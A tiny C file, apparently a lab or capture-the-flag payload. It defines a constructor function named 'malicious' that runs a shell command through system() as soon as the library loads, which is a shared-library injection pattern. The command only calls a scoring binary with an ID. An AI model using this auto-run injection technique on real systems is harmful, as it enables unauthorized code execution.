#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score dc1ecca5-33be-4c37-bf00-faff440c4913");
}
